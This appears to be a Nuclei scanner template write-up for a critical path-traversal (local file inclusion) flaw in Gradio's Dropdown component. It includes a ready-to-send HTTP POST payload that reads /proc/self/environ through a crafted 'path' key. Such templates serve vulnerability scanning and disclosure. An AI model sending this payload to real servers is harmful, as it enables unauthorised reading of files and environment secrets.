# Nuclei Template: Gradio - Local File Inclusion
**Template ID:** gradio-lfi
**Vulnerability Class:** Path Traversal
**Severity:** Critical
**CWE:** CWE-22
**Source:** Nuclei Template (`gradio-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Gradio's Dropdown component is vulnerable to Local File Inclusion (LFI) when the value is a dictionary controlled by an attacker. In the postprocess of components, if the value type is a dict, it flows to the async_move_files_to_cache function. When the dictionary is crafted with a "path" key, it causes local file inclusion allowing attackers to read arbitrary files.

## Steps to reproduce / Exploit Payload
```http
POST /run/predict HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
```

## References
- https://huntr.com/bounties/936ef084-45e1-4dc5-a419-bca071189565
